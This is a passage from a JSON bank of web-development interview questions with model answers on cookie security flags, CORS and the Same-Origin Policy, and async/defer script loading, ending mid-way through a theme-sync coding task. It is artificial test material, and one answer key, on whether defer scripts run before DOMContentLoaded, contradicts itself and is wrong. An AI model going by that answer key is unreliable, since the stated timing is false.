            "B) `HttpOnly` prevents JavaScript access to cookies (mitigating XSS), while `SameSite` restricts cross-site cookie sending (mitigating CSRF).",
            "C) Both `HttpOnly` and `SameSite` primarily prevent XSS attacks by restricting cookie visibility.",
            "D) Both `HttpOnly` and `SameSite` primarily prevent CSRF attacks by ensuring cookies are only sent over HTTPS."
          ],
          "analysisPoints": [
            "Tests ability to differentiate the specific attack vectors addressed by `HttpOnly` and `SameSite`.",
            "Ensures clear understanding of XSS (client-side script injection) vs. CSRF (unauthorized requests from user's browser)."
          ],
          "keyConcepts": [
            "httponly",
            "samesite",
            "xss",
            "csrf",
            "security-flags"
          ],
          "evaluationCriteria": [
            "Correctly associates each flag with its primary defense mechanism"
          ],
          "example": "`HttpOnly` makes cookies inaccessible to client-side scripts, protecting against attackers stealing cookies via XSS. `SameSite` dictates when cookies are sent with cross-site requests, specifically preventing an attacker from tricking a user's browser into making an unwanted request to a legitimate site while logged in (CSRF).",
          "tags": [
            "web-security",
            "cookies",
            "xss",
            "csrf",
            "mcq"
          ],
          "prerequisites": [
            "xss_basics",
            "csrf_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_cors_1",
          "topic": "CORS Fundamentals",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of CORS?",
          "answer": "CORS (Cross-Origin Resource Sharing) is a security mechanism that allows web applications running at one domain to make controlled requests to resources at another domain, safely bypassing the Same-Origin Policy.",
          "options": [],
          "analysisPoints": [
            "Tests basic definition and purpose of CORS.",
            "Connects CORS to the Same-Origin Policy."
          ],
          "keyConcepts": [
            "cors",
            "same-origin-policy",
            "web-security"
          ],
          "evaluationCriteria": [
            "Direct recall of CORS definition"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cors",
            "flashcard"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_cors_2",
          "topic": "Same-Origin Policy",
          "level": "medium",
          "type": "open",
          "question": "Describe the Same-Origin Policy (SOP) and explain why it is a fundamental security concept in web browsers. How does CORS relate to or modify the SOP?",
          "answer": "The **Same-Origin Policy (SOP)** is a critical security mechanism built into web browsers. It dictates that a web page can only interact (read, write, or make requests) with resources that originate from the same 'origin'. An origin is defined by the combination of protocol (e.g., `http`, `https`), host (domain name, e.g., `example.com`), and port (e.g., `80`, `443`). If any of these three components differ, the origins are considered different.\n\n**Why it's fundamental for security**: The SOP prevents malicious websites from accessing sensitive data loaded from other websites in the user's browser. Without SOP, a malicious script embedded on `evil.com` could, for instance, make an AJAX request to `yourbank.com` while you're logged in, read your account balance, and send it to the attacker's server. SOP effectively sandboxes web content, isolating documents from different origins to prevent such data theft.\n\n**How CORS relates to SOP**: CORS (Cross-Origin Resource Sharing) does not 'disable' the SOP; rather, it provides a controlled, secure way to *relax* it for legitimate cross-origin communication. While SOP *by default* blocks cross-origin requests, CORS introduces a mechanism for servers to explicitly grant permissions to specific origins. Servers use special HTTP response headers (like `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, etc.) to inform the browser that a particular cross-origin request is permissible. The browser, acting as the enforcer of SOP, will then allow the request to proceed if the server's CORS headers indicate permission, otherwise, it will block the request and raise a CORS error. This allows APIs to be consumed by different frontend applications while maintaining security.",
          "options": [],
          "analysisPoints": [
            "Tests deep understanding of SOP definition and purpose.",
            "Explains the security rationale behind SOP.",
            "Clearly articulates how CORS works as an intentional relaxation of SOP.",
            "Mentions the key components of an 'origin'."
          ],
          "keyConcepts": [
            "same-origin-policy",
            "web-security",
            "cors",
            "browser-security",
            "origin-definition"
          ],
          "evaluationCriteria": [
            "Comprehensive explanation",
            "Accuracy of security implications",
            "Clarity of CORS-SOP relationship"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cors",
            "open-ended"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_cors_3",
          "topic": "CORS Request Types",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following requests would typically *not* trigger a CORS preflight (`OPTIONS`) request?\n\nA) A `PUT` request with `Content-Type: application/json`.\nB) A `GET` request with a custom header `X-Auth-Token`.\nC) A `POST` request with `Content-Type: text/plain`.\nD) A `DELETE` request to a different origin.",
          "answer": "C) A `POST` request with `Content-Type: text/plain`.",
          "options": [
            "A) A `PUT` request with `Content-Type: application/json`.",
            "B) A `GET` request with a custom header `X-Auth-Token`.",
            "C) A `POST` request with `Content-Type: text/plain`.",
            "D) A `DELETE` request to a different origin."
          ],
          "analysisPoints": [
            "Tests knowledge of simple vs. non-simple requests in CORS.",
            "Requires recalling the specific conditions for a simple request (methods and headers)."
          ],
          "keyConcepts": [
            "cors",
            "preflight-request",
            "simple-request",
            "non-simple-request"
          ],
          "evaluationCriteria": [
            "Correctly identifies the simple request scenario"
          ],
          "example": "Simple requests are typically `GET`, `POST`, or `HEAD` with specific `Content-Type` headers (`application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`) and no custom headers. Options A, B, and D are all non-simple: `PUT` and `DELETE` are non-simple methods, and a custom header (`X-Auth-Token`) makes a `GET` request non-simple.",
          "tags": [
            "web-security",
            "cors",
            "mcq"
          ],
          "prerequisites": [
            "http_methods"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_cors_4",
          "topic": "CORS Headers",
          "level": "easy",
          "type": "flashcard",
          "question": "Which CORS header is used by the server to specify which origins are allowed to access the resource?",
          "answer": "`Access-Control-Allow-Origin`",
          "options": [],
          "analysisPoints": [
            "Tests recall of the most fundamental CORS header.",
            "Connects header to its specific function."
          ],
          "keyConcepts": [
            "cors",
            "access-control-allow-origin",
            "http-headers"
          ],
          "evaluationCriteria": [
            "Direct recall of header name"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cors",
            "flashcard"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_cors_5",
          "topic": "CORS Credentials",
          "level": "medium",
          "type": "open",
          "question": "When making a cross-origin `fetch` request that needs to include cookies (or HTTP authentication), what specific client-side `fetch` option and server-side CORS header are required for this to work correctly? Explain why both are necessary.",
          "answer": "To include credentials (like cookies or HTTP authentication) in a cross-origin `fetch` request, both client-side and server-side configurations are required:\n\n1.  **Client-side `fetch` option**: You must set `credentials: 'include'` in the `fetch` request options. For example:\n    ```javascript\n    fetch('https://api.example.com/data', {\n      method: 'GET',\n      credentials: 'include'\n    });\n    ```\n    By default, `fetch` requests with cross-origin URLs do not send cookies or HTTP authentication headers. Setting `credentials: 'include'` explicitly tells the browser to send them.\n\n2.  **Server-side CORS header**: The server must respond with the `Access-Control-Allow-Credentials: true` header. For example:\n    ```\n    Access-Control-Allow-Origin: https://your-frontend-domain.com\n    Access-Control-Allow-Credentials: true\n    ```\n    This header tells the browser that the server is willing to accept requests that include credentials from the specified `Access-Control-Allow-Origin`. **Important**: If `Access-Control-Allow-Credentials` is `true`, then `Access-Control-Allow-Origin` *cannot* be the wildcard `*`; it must be a specific origin.\n\n**Why both are necessary**: The browser acts as a security gatekeeper. The `credentials: 'include'` option signals to the browser that *you intend* to send credentials with this cross-origin request. However, the browser will *only* send them if the server explicitly grants permission via `Access-Control-Allow-Credentials: true` in its response. This two-way consent mechanism ensures that credentials are not inadvertently leaked to unapproved third-party servers, upholding the principle of least privilege and enhancing security.",
          "options": [],
          "analysisPoints": [
            "Tests knowledge of `fetch` API `credentials` option.",
            "Tests knowledge of `Access-Control-Allow-Credentials` header.",
            "Explains the necessity of both client and server configuration.",
            "Highlights the restriction of `Access-Control-Allow-Origin` when `Credentials` is true."
          ],
          "keyConcepts": [
            "cors",
            "fetch-api",
            "credentials",
            "access-control-allow-credentials",
            "http-headers",
            "web-security"
          ],
          "evaluationCriteria": [
            "Accuracy of required configurations",
            "Clarity of explanation for mutual necessity",
            "Correctly identifies `*` restriction"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cors",
            "open-ended",
            "fetch-api"
          ],
          "prerequisites": [
            "fetch_api_basics",
            "http_headers"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_cors_6",
          "topic": "CORS Troubleshooting",
          "level": "hard",
          "type": "code",
          "question": "You are building a React frontend application hosted on `http://localhost:3000` and it needs to communicate with a Node.js API server running on `http://localhost:5000`. Your `fetch` request from the React app looks like this:\n\n```javascript\nfetch('http://localhost:5000/api/data', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'X-Auth-Token': 'mysecuretoken'\n  },\n  body: JSON.stringify({ item: 'new item' })\n})\n.then(response => response.json())\n.then(data => console.log(data))\n.catch(error => console.error('Fetch error:', error));\n```\n\nWhen you try to run this, you encounter a CORS error in the browser console. Provide the minimum necessary Node.js (Express) server-side CORS configuration using `app.use()` that would resolve this specific error, allowing the `POST` request to succeed. Explain why each header you add is necessary.",
          "answer": "```javascript\nconst express = require('express');\nconst app = express();\n\napp.use(express.json()); // To parse JSON request bodies\n\napp.use((req, res, next) => {\n  // 1. Access-Control-Allow-Origin: Required because request is from a different origin (port 3000 vs 5000)\n  //    Specify the exact origin of the frontend application.\n  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');\n\n  // 2. Access-Control-Allow-Methods: Required because this is a non-simple request (POST with custom headers).\n  //    The browser will send an OPTIONS preflight request first, which needs to be allowed.\n  //    Include POST, and critically, OPTIONS for the preflight.\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');\n\n  // 3. Access-Control-Allow-Headers: Required because the request includes non-simple headers\n  //    ('Content-Type: application/json' and 'X-Auth-Token').\n  //    These headers must be explicitly allowed by the server for the browser to permit the request.\n  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Auth-Token');\n\n  // Handle preflight OPTIONS requests immediately after setting headers\n  // The browser sends an OPTIONS request to check permissions before the actual POST.\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(204); // Respond with 204 No Content for successful preflight\n  }\n\n  next();\n});\n\n// Example POST endpoint to receive data\napp.post('/api/data', (req, res) => {\n  console.log('Received data:', req.body);\n  res.json({ message: 'Data received successfully!', received: req.body });\n});\n\napp.listen(5000, () => {\n  console.log('API server listening on port 5000');\n});\n```\n\n**Explanation of headers:**\n\n1.  **`Access-Control-Allow-Origin: 'http://localhost:3000'`**: This is fundamental. The frontend (`http://localhost:3000`) is trying to access a resource on a different origin (`http://localhost:5000`). The server *must* explicitly tell the browser that requests from `http://localhost:3000` are permitted. Using `*` is generally not recommended for production APIs when specific origins are known, as it allows *any* origin to access the resource.\n\n2.  **`Access-Control-Allow-Methods: 'GET, POST, PUT, DELETE, OPTIONS'`**: The client is making a `POST` request. Since this is a non-simple request (due to `Content-Type: application/json` and the custom header `X-Auth-Token`), the browser first sends an `OPTIONS` preflight request. Both `POST` and `OPTIONS` methods must be explicitly allowed by the server in its response to the preflight.\n\n3.  **`Access-Control-Allow-Headers: 'Content-Type, Authorization, X-Auth-Token'`**: The client's request includes two non-simple headers: `Content-Type: application/json` and `X-Auth-Token`. For the browser to allow these headers in a cross-origin request, the server must explicitly list them in the `Access-Control-Allow-Headers` response header during the preflight. `Authorization` is included because `X-Auth-Token` effectively serves a similar purpose and `Authorization` is a common header to allow.",
          "options": [],
          "analysisPoints": [
            "Tests ability to identify the root causes of CORS errors based on client-side request details.",
            "Requires knowledge of preflight requests and their impact on method and header allowances.",
            "Assesses practical implementation of CORS headers in a common backend framework (Express).",
            "Evaluates the ability to explain the purpose of each header in context."
          ],
          "keyConcepts": [
            "cors",
            "preflight-request",
            "access-control-allow-origin",
            "access-control-allow-methods",
            "access-control-allow-headers",
            "http-headers",
            "troubleshooting",
            "backend"
          ],
          "evaluationCriteria": [
            "Correct and complete server-side configuration.",
            "Accurate explanation for each header's necessity.",
            "Demonstrates understanding of simple vs. non-simple requests and preflights.",
            "Code is runnable and directly addresses the problem."
          ],
          "example": "",
          "tags": [
            "web-security",
            "cors",
            "coding-challenge",
            "hard",
            "backend"
          ],
          "prerequisites": [
            "http_basics",
            "node_express_basics",
            "fetch_api_basics"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_cors_7",
          "topic": "CORS - Wildcard Origin Security",
          "level": "medium",
          "type": "flashcard",
          "question": "Is it always safe to use `Access-Control-Allow-Origin: *` in production? Explain why or why not.",
          "answer": "No, it is generally *not* safe to use `Access-Control-Allow-Origin: *` in production unless your API is truly public and does not handle any sensitive user data or requires authentication. The reason is that `*` allows *any* origin to access your resources, removing the origin-based security provided by CORS. This can be problematic if your API uses cookies or HTTP authentication, as `Access-Control-Allow-Credentials: true` cannot be used in conjunction with `Access-Control-Allow-Origin: *`.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of the security implications of wildcard origin.",
            "Highlights the restriction with `Access-Control-Allow-Credentials`.",
            "Encourages critical thinking about API access control."
          ],
          "keyConcepts": [
            "cors",
            "access-control-allow-origin",
            "security-risks",
            "wildcard",
            "authentication"
          ],
          "evaluationCriteria": [
            "Correctly identifies security risk",
            "Explains the `Credentials` interaction"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cors",
            "flashcard",
            "best-practices"
          ],
          "prerequisites": [
            "cors_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_script_loading_1",
          "topic": "Script Loading Strategies",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the main drawback of using a regular `<script>` tag without `async` or `defer` in the `<head>` of an HTML document?",
          "answer": "It blocks HTML parsing and rendering until the script is downloaded and executed, which can delay page load time and user experience.",
          "options": [],
          "analysisPoints": [
            "Tests basic knowledge of blocking behavior.",
            "Connects script loading to page performance."
          ],
          "keyConcepts": [
            "script-loading",
            "blocking",
            "html-parsing",
            "performance"
          ],
          "evaluationCriteria": [
            "Direct recall of drawback"
          ],
          "example": "",
          "tags": [
            "performance",
            "script-loading",
            "flashcard"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_script_loading_2",
          "topic": "Script Loading Strategies: Async vs. Defer",
          "level": "medium",
          "type": "mcq",
          "question": "You have two external JavaScript files: `analytics.js` (for tracking, does not modify DOM) and `main.js` (initializes your UI after DOM is ready). Which combination of script loading attributes is generally best for optimal performance and correct functionality?\n\nA) `<script defer src=\"analytics.js\"></script>` and `<script async src=\"main.js\"></script>`\nB) `<script async src=\"analytics.js\"></script>` and `<script defer src=\"main.js\"></script>`\nC) `<script src=\"analytics.js\"></script>` and `<script src=\"main.js\"></script>`\nD) `<script defer src=\"analytics.js\"></script>` and `<script defer src=\"main.js\"></script>`",
          "answer": "B) `<script async src=\"analytics.js\"></script>` and `<script defer src=\"main.js\"></script>`",
          "options": [
            "A) `<script defer src=\"analytics.js\"></script>` and `<script async src=\"main.js\"></script>`",
            "B) `<script async src=\"analytics.js\"></script>` and `<script defer src=\"main.js\"></script>`",
            "C) `<script src=\"analytics.js\"></script>` and `<script src=\"main.js\"></script>`",
            "D) `<script defer src=\"analytics.js\"></script>` and `<script defer src=\"main.js\"></script>`"
          ],
          "analysisPoints": [
            "Tests understanding of the practical use cases for `async` and `defer`.",
            "Distinguishes between scripts that depend on DOM and those that are independent.",
            "Considers performance implications.",
            "The relative order of `async` and `defer` in the HTML doesn't strictly matter for their *execution* order relative to HTML parsing, but the choice of attribute does."
          ],
          "keyConcepts": [
            "async-script",
            "defer-script",
            "performance",
            "dom-ready",
            "script-execution-order"
          ],
          "evaluationCriteria": [
            "Correctly applies attributes based on script dependencies and impact"
          ],
          "example": "`async` is ideal for `analytics.js` because it's independent and won't block parsing, executing as soon as it's ready. `defer` is ideal for `main.js` because it depends on the DOM being ready and will execute after HTML parsing, ensuring elements are available. Option D would also work correctly if `analytics.js` doesn't *need* to run *immediately* as it downloads, but `async` offers potentially earlier execution if `analytics.js` finishes downloading very quickly.",
          "tags": [
            "performance",
            "script-loading",
            "async",
            "defer",
            "mcq"
          ],
          "prerequisites": [
            "html_basics",
            "browser_rendering_process"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_script_loading_3",
          "topic": "Script Loading Execution Order",
          "level": "medium",
          "type": "open",
          "question": "You have an HTML file with the following script tags in the `<head>`:\n\n```html\n<script async src=\"scriptA.js\"></script>\n<script defer src=\"scriptB.js\"></script>\n<script async src=\"scriptC.js\"></script>\n<script src=\"scriptD.js\"></script>\n```\n\nAssume all scripts are external and of similar size, and network conditions are typical. Describe the likely order of execution for these scripts relative to each other and to the HTML parsing. What considerations might alter this order?",
          "answer": "Here's the likely order of execution:\n\n1.  **`scriptD.js` (Regular script)**: This script will block HTML parsing. It will be fetched and executed as soon as the browser encounters it. HTML parsing will pause until `scriptD.js` finishes execution.\n\n2.  **`scriptA.js` and `scriptC.js` (Async scripts)**: These scripts will be downloaded in parallel with HTML parsing (which is paused by `scriptD.js` currently, but will resume after `scriptD.js` completes). They will execute as soon as they finish downloading, *regardless* of their order in the HTML or other scripts. Therefore, the execution order between `scriptA.js` and `scriptC.js` is *not guaranteed* and depends on which one finishes downloading first.\n\n3.  **`scriptB.js` (Defer script)**: This script will also be downloaded in parallel with HTML parsing. However, it will *only* execute after the entire HTML document has been parsed and the DOM is ready (just before `DOMContentLoaded` event). If there were multiple `defer` scripts, their relative execution order would be guaranteed based on their appearance in the HTML.\n\n**Likely Execution Order Summary (Conceptual):**\n1.  `scriptD.js` (blocks, executes when ready)\n2.  HTML parsing resumes/continues.\n3.  `scriptA.js` or `scriptC.js` (whichever downloads first) executes.\n4.  The other of `scriptA.js` or `scriptC.js` executes.\n5.  HTML parsing completes.\n6.  `scriptB.js` executes.\n\n**Considerations that might alter this order:**\n-   **Network Latency and Script Size**: The actual download time for `async` and `defer` scripts heavily influences their execution timing. A smaller `async` script on a fast CDN might execute much earlier than a larger `async` script on a slow server.\n-   **Browser Cache**: If a script is cached, it will execute much faster, potentially altering the perceived order relative to un-cached scripts.\n-   **HTTP/2 Multiplexing**: While scripts are downloaded in parallel, actual download speeds can vary.\n-   **Blocking by other resources**: If other critical resources (like CSS in the head) block rendering, it could indirectly affect when the browser prioritizes script execution.\n-   **Inline scripts**: Any inline `<script>` tags encountered during parsing will block parsing and execute immediately, potentially interspersing with `async` downloads and before `defer` execution.",
          "options": [],
          "analysisPoints": [
            "Tests comprehensive understanding of all three script loading types.",
            "Requires knowledge of execution order guarantees and non-guarantees.",
            "Assesses understanding of blocking vs. non-blocking behavior.",
            "Considers practical factors that influence actual timing (network, cache).",
            "Demonstrates ability to reason about complex browser behavior."
          ],
          "keyConcepts": [
            "script-loading",
            "async",
            "defer",
            "blocking-script",
            "html-parsing",
            "execution-order",
            "performance"
          ],
          "evaluationCriteria": [
            "Accurate description of each script's behavior.",
            "Correctly identifies guaranteed vs. non-guaranteed order.",
            "Thorough explanation of influencing factors."
          ],
          "example": "",
          "tags": [
            "performance",
            "script-loading",
            "open-ended",
            "hard"
          ],
          "prerequisites": [
            "browser_rendering_process",
            "html_structure"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_script_loading_4",
          "topic": "Script Loading - DOMContentLoaded",
          "level": "medium",
          "type": "flashcard",
          "question": "Which script loading attribute, `async` or `defer`, is guaranteed to execute before the `DOMContentLoaded` event fires?",
          "answer": "Neither `async` nor `defer` scripts are guaranteed to execute before `DOMContentLoaded`. `async` scripts execute as soon as they finish downloading (which could be before or after `DOMContentLoaded`), while `defer` scripts execute *just before* `DOMContentLoaded` but *after* HTML parsing is complete.",
          "options": [],
          "analysisPoints": [
            "Tests precise understanding of `async` and `defer` execution timing relative to `DOMContentLoaded`.",
            "Corrects common misconception about `async` always being after `DOMContentLoaded`."
          ],
          "keyConcepts": [
            "async-script",
            "defer-script",
            "dom-content-loaded",
            "execution-order"
          ],
          "evaluationCriteria": [
            "Accurate comparison of timing",
            "Correct identification of event relationship"
          ],
          "example": "",
          "tags": [
            "performance",
            "script-loading",
            "flashcard"
          ],
          "prerequisites": [
            "dom_events",
            "browser_rendering_process"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_script_loading_5",
          "topic": "Script Loading - Best Practices",
          "level": "medium",
          "type": "open",
          "question": "For a typical modern web application that heavily relies on JavaScript for interactivity and DOM manipulation, what is generally the recommended strategy for placing and loading your main application JavaScript bundle (`app.bundle.js`)? Justify your choice by explaining the benefits of this approach over alternatives.",
          "answer": "For a typical modern web application with heavy JavaScript reliance on DOM manipulation, the recommended strategy for loading the main application bundle (`app.bundle.js`) is generally to use `<script defer src=\"app.bundle.js\"></script>` and place it in the `<head>` or just before the closing `</body>` tag.\n\n**Justification for `defer`:**\n1.  **Non-blocking HTML Parsing**: The `defer` attribute allows the browser to download `app.bundle.js` in parallel with HTML parsing. This means the browser can continue rendering the HTML structure to the user without waiting for the large JavaScript file to be downloaded and executed, significantly improving perceived performance (Time to First Contentful Paint - FCP).\n2.  **Guaranteed DOM Readiness**: `defer` scripts execute only after the entire HTML document has been parsed. This is crucial for applications that heavily interact with or manipulate the DOM, as it ensures that all necessary HTML elements are available when the script runs, avoiding 'null' errors for missing elements. This happens just before the `DOMContentLoaded` event.\n3.  **Guaranteed Execution Order**: If you have multiple deferred scripts (e.g., `vendor.js` and `app.bundle.js` where `app.bundle.js` depends on `vendor.js`), `defer` guarantees that they execute in the order they appear in the HTML. This is vital for managing dependencies.\n\n**Why `defer` over alternatives:**\n-   **Over Regular `<script>` (blocking)**: A regular script would block HTML parsing and rendering for the entire duration of its download and execution. For a large `app.bundle.js`, this would lead to a blank page or significantly delayed rendering, providing a very poor user experience.\n-   **Over `async`**: While `async` also downloads in parallel, it executes as soon as it's downloaded. This means `app.bundle.js` could execute before the DOM is fully parsed, leading to errors if it tries to manipulate elements that don't exist yet. Also, `async` doesn't guarantee execution order, which can be problematic for interdependent application modules.\n-   **Placement (Head vs. Body End)**: While `defer` makes placement in the `head` safe (since it waits for DOM parsing anyway), placing it just before `</body>` *without* `defer` is a common old practice to avoid blocking. However, `defer` in the `head` is generally superior as it starts the download earlier. When using `defer`, the exact position (head vs. body end) matters less for execution timing relative to DOMContentLoaded, but placing it earlier helps initiate download sooner.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of best practices for large JS bundles.",
            "Requires detailed comparison of `defer` benefits against `async` and regular scripts.",
            "Connects script loading to core web performance metrics (FCP, DOMContentLoaded).",
            "Justifies the choice based on typical application needs (DOM interaction, dependencies)."
          ],
          "keyConcepts": [
            "script-loading",
            "defer-script",
            "performance-optimization",
            "dom-manipulation",
            "bundle-loading",
            "frontend-architecture"
          ],
          "evaluationCriteria": [
            "Clear recommendation and strong justification",
            "Accurate comparison of attributes",
            "Understanding of performance implications"
          ],
          "example": "",
          "tags": [
            "performance",
            "script-loading",
            "open-ended",
            "best-practices"
          ],
          "prerequisites": [
            "web_performance_basics",
            "browser_rendering_process"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_script_loading_6",
          "topic": "Script Loading: Async vs Defer",
          "level": "medium",
          "type": "code",
          "question": "You have a webpage with the following structure:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Script Test</title>\n    <script async src=\"script1.js\"></script>\n    <script defer src=\"script2.js\"></script>\n    <script>\n        console.log(\"Inline script 1: HTML parsed.\");\n    </script>\n</head>\n<body>\n    <div id=\"root\"></div>\n    <script>\n        console.log(\"Inline script 2: Body loaded.\");\n        document.addEventListener('DOMContentLoaded', () => {\n            console.log(\"DOMContentLoaded fired.\");\n        });\n    </script>\n    <script async src=\"script3.js\"></script>\n    <script defer src=\"script4.js\"></script>\n</body>\n</html>\n```\n\nAnd the content of the external scripts:\n\n`script1.js`:\n```javascript\nconsole.log(\"script1.js executed (async, head).\");\n```\n\n`script2.js`:\n```javascript\nconsole.log(\"script2.js executed (defer, head).\");\n```\n\n`script3.js`:\n```javascript\nconsole.log(\"script3.js executed (async, body end).\");\n```\n\n`script4.js`:\n```javascript\nconsole.log(\"script4.js executed (defer, body end).\");\n```\n\nPredict the *most likely* order of console logs. Assume negligible network latency and that `script1.js` and `script3.js` finish downloading slightly faster than `script2.js` and `script4.js` respectively. Explain your reasoning.",
          "answer": "The most likely order of console logs will be:\n\n1.  `Inline script 1: HTML parsed.` (from `<head>` inline script)\n2.  `script1.js` executed (async, head).\n3.  `Inline script 2: Body loaded.` (from inline script at `</body>` end)\n4.  `script3.js` executed (async, body end).\n5.  `script2.js` executed (defer, head).\n6.  `script4.js` executed (defer, body end).\n7.  `DOMContentLoaded fired.`\n\n**Reasoning:**\n\n1.  **`Inline script 1`**: This is a regular inline script in the `<head>`. The browser encounters it, pauses HTML parsing, and executes it immediately. Thus, it's the first log.\n2.  **`script1.js` (async)**: This script is in the `<head>` with `async`. It starts downloading in parallel with parsing. Since we assume negligible latency and it finishes downloading slightly faster, it executes as soon as it's ready, *before* the browser reaches the `<body>` or `DOMContentLoaded`.\n3.  **`Inline script 2`**: This is a regular inline script placed just before `</body>`. The browser pauses HTML parsing to execute it once it reaches this point. At this point, the HTML before it (including the `#root` div) has been parsed.\n4.  **`script3.js` (async)**: This script is also `async` and placed at the end of the `<body>`. It downloaded in parallel with the HTML. Given it finished downloading slightly faster, it executes as soon as it's ready, which would be after `Inline script 2` and before `DOMContentLoaded`.\n5.  **`script2.js` (defer)**: This script is in the `<head>` with `defer`. It downloads in parallel, but its execution is *deferred* until HTML parsing is complete. All `defer` scripts execute in order of appearance just before `DOMContentLoaded`.\n6.  **`script4.js` (defer)**: This script is at the end of the `<body>` with `defer`. Similar to `script2.js`, it waits for HTML parsing to complete. Since `defer` scripts maintain their relative order, `script4.js` executes after `script2.js`.\n7.  **`DOMContentLoaded fired.`**: This event fires after the HTML document has been completely loaded and parsed, and all `defer` scripts have executed. It also fires after all `async` scripts that happened to finish downloading before it.\n\n**Note on `async` execution**: The relative order between `script1.js` and `script3.js` and any inline scripts is not strictly guaranteed and depends on download times. However, based on the assumption that `script1.js` is in the head and finishes downloading fast, it's likely to execute earlier than `script3.js` which is placed later. The key is that `async` scripts do not wait for HTML parsing to complete and do not block it, executing whenever they are ready. `defer` scripts, conversely, wait for HTML parsing to complete and execute *in order* before `DOMContentLoaded`.",
          "options": [],
          "analysisPoints": [
            "Tests intricate understanding of `async`, `defer`, and regular script loading behaviors.",
            "Evaluates knowledge of execution order rules, especially regarding parallel downloads and deferred execution.",
            "Assesses comprehension of `DOMContentLoaded` timing relative to script types.",
            "Requires careful parsing of HTML structure and script attributes."
          ],
          "keyConcepts": [
            "script-loading",
            "async-script",
            "defer-script",
            "blocking-script",
            "html-parsing",
            "execution-order",
            "dom-content-loaded",
            "browser-rendering"
          ],
          "evaluationCriteria": [
            "Correct prediction of the most likely execution order.",
            "Accurate reasoning for each script's behavior.",
            "Demonstrates a nuanced understanding of browser loading processes."
          ],
          "example": "",
          "tags": [
            "performance",
            "script-loading",
            "coding-challenge",
            "hard"
          ],
          "prerequisites": [
            "browser_rendering_process",
            "html_structure"
          ],
          "complexity": 9,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_storage_event_sync",
          "title": "Cross-Tab Theme Synchronization",
          "description": "\nImplement a feature where users can change their preferred theme (e.g., 'light' or 'dark') in one browser tab, and this change should immediately reflect in all other open tabs or windows of the same web application. Use `localStorage` to persist the theme and the `storage` event to synchronize changes across tabs.\n\n**Requirements:**\n1.  Create a simple HTML page with a button to toggle between 'light' and 'dark' themes. You can apply a CSS class to the `<body>` or `<html>` element to change the theme.\n2.  Store the current theme preference in `localStorage`.\n3.  When the theme is changed in one tab, the `storage` event should propagate this change to other tabs.\n4.  Other tabs should listen for the `storage` event and update their theme based on the new value from `localStorage`.\n5.  The tab that initiated the change should update its own theme directly (it won't receive the `storage` event). Ensure consistency across all tabs.\n6.  On initial page load, the theme should be loaded from `localStorage`.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Theme Sync Demo</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            transition: background-color 0.3s, color 0.3s;\n        }\n        body.light-theme {\n            background-color: #f0f0f0;\n            color: #333;\n        }\n        body.dark-theme {\n            background-color: #333;\n            color: #f0f0f0;\n        }\n    </style>\n</head>\n<body class=\"light-theme\">\n    <h1>Cross-Tab Theme Synchronizer</h1>\n    <p>Current Theme: <span id=\"currentThemeDisplay\">Light</span></p>\n    <button id=\"toggleThemeBtn\">Toggle Theme</button>\n\n    <script>\n        const THEME_KEY = 'appTheme';\n        const body = document.body;\n        const toggleBtn = document.getElementById('toggleThemeBtn');\n        const themeDisplay = document.getElementById('currentThemeDisplay');\n\n        function applyTheme(theme) {\n            body.className = ''; // Clear existing classes\n            if (theme === 'dark') {\n                body.classList.add('dark-theme');\n                themeDisplay.textContent = 'Dark';\n            } else {\n                body.classList.add('light-theme');\n                themeDisplay.textContent = 'Light';\n            }\n        }\n\n        // TODO: Implement initial theme load from localStorage\n        // TODO: Implement toggle theme logic (update localStorage and applyTheme)\n        // TODO: Implement storage event listener for cross-tab sync\n\n        // Initial load\n        const storedTheme = 